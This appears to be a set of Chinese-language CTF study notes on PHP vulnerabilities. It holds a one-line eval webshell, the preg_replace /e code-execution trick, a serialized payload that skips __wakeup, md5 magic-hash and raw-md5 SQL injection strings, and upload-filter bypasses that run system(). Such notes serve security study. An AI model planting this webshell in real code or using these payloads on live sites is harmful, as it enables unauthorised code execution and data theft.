# php漏洞

## 函数利用

### preg_replace_callback

```php
<?php
preg_replace_callback("/.*/",function ($a){@eval($a[0]);},$_GET["h"]);
?>
```



利用条件:php版本=7

### preg_replace()

preg_replace漏洞触发有两个前提：

1. 第一个参数需要e标识符，有了它可以执行第二个参数的命令

2. 第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令，举个例子：

3. php版本<7

4. ```php
   echo preg_replace('/test/e', 'phpinfo()', 'just test');
   //这样是可以执行命令的
   
   echo preg_replace('/test/e', 'phpinfo()', 'just tesxt'); 
   echo preg_replace('/tesxt/e', 'phpinfo()', 'just test'); 
   //这两种没有匹配上，所以返回值是第三个参数，不能执行命令
   ```



## 函数绕过

### PHP反序列化绕过__wakeup方法

当反序列化字符串中，表示属性个数的值大于真实属性个数时，会跳过 **__wakeup** 函数的执行。

```php
<?php
    class xctf{ 
	public $flag = '111';
    public function __wakeup(){
	exit('bad requests');
		}
	}
	echo unserialize($_GET['code']);
    ?>
```

这题关键是绕过__wakeup()函数

**当反序列化字符串中，表示属性个数的值大于真实属性个数时**

正常:?code=O:**1**:"xctf":3:{s:4:"flag";s:3:"111";}

payload:?code=O:**4**:"xctf":3:{s:4:"flag";s:3:"111";}

### md5相关

1. md5和弱类型比较的联合利用

   ```php
   if($_GET['password']!='xxxxxx'&&md5('xxxxxx')==md5($_GET['password']))
       echo $flag;
   ```

   (0-9)e开头字符串会被认为是数字

   所以md5加密后为0e开头的字符串都相等

2. ```php
   "select * from `admin` where password='".md5($pass,true)."'"
   ```
md5($var,true)会返回一个原始的二进制数据，某些数据会被当成字符串
   
   > raw MD5 hashes are dangerous in SQL statements because they can contain characters with special meaning to MySQL(原始值会包含mysql中的特殊字符，因此很危险）。
   
   特殊字符串:
   
   >129581926211651571912466741651878684928
   >ffifdyop



### strcmp

- 利用条件：
适用于5.3之前版本的php
- 接收到非字符串类型的变量会报错，并返回0

## 文件包含漏洞

### php伪协议

### 配合文件上传的漏洞

- 文件上传后缀名绕过看web杂项

- 文件内容被更换

  - 如<?php ?>中的<?和?>被替换，可以用<script>标签绕过

  ```php+HTML
  <script langulage=php>
  system("ls");
  </script>
  ```

  -    <? echo 'this is the simplest, an SGML processing instruction'; ?>
        <?= expression ?> This is a shortcut for "<? echo expression ?>"

  ​        利用条件：php.ini 配置文件中的指令 [short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag) 打开后才可用

  -  <% echo 'You may optionally use ASP-style tags'; %>
        <%= $variable; # This is a shortcut for "<% echo . . ." %>  

      利用条件：php.ini 配置文件中的指令 [asp_tags](https://www.php.net/manual/zh/ini.core.php#ini.asp-tags) 打开后才可用。

## 杂

### '0xaa'可以被理解为数字(php7之前的版本)
所以'0xccccccccc'='54975581388'

